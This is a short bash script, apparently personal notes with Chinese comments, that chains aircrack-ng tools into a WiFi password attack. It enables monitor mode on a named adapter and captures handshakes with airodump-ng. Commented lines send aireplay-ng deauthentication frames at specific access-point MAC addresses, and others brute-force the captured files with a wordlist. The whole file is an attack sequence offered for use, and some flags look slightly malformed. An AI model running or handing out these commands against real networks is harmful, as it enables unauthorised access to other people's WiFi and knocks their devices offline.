#!/bin/bash
airmon-ng check kill
airmon-ng start wlxec3dfde15940
airodump-ng mon0

#sudo airodump-ng -w  保存文件路径及名字 -c  信道  mon0 
airodump-ng -w /home/bleach/aircrack/ch -c -9  mon0 


#aireplay-ng --deaut 10 -a 目标AP mac -c 本机mac  接口名
#sudo aireplay-ng --deaut 10 -a 3c:37:86:8a:b3:90 -c ec:3d:fd:e1:59:40  mon0
#sudo aireplay-ng --deauth 10 -a E4:F4:C6:0C:F7:5D -c ec:3d:fd:e1:59:40  mon0



#使用密码本暴力破解
#aircrack-ng -w ~/airack/wordlist.txt  ~/airack/ch-01.cap
#aircrack-ng -w ~/airack/wordlist.txt  ~/airack/ch10-01.cap
